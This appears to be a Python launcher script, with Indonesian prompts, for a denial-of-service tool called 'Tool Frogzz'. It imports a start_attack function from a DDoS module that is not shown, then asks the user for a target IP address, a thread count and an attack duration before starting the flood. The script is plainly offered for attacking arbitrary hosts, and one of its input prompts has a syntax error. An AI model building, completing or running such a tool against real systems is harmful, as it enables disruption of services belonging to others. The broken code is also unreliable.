from DDoS_V0_5 import start_attack

def main():
    print("Welcome to Tool Frogzz")
    print("------------------------")
    print("Pilih opsi:")
    print("[1] DDoS")
    print("[2] Keluar")
    
    pilihan = input("Masukkan pilihan: ")
    
    if pilihan == "1":
        target = input( Masukkan IP target (contoh: 123.45.67.89): ")
        threads = int(input("Masukkan jumlah thread: "))
        duration = int(input("Masukkan durasi serangan dalam detik: "))
        start_attack(target, threads, duration)
    elif pilihan == "2":
        print("Keluar dari tool.")
    else:
        print("Pilihan tidak valid.")

if __name__ == "__main__":
    main()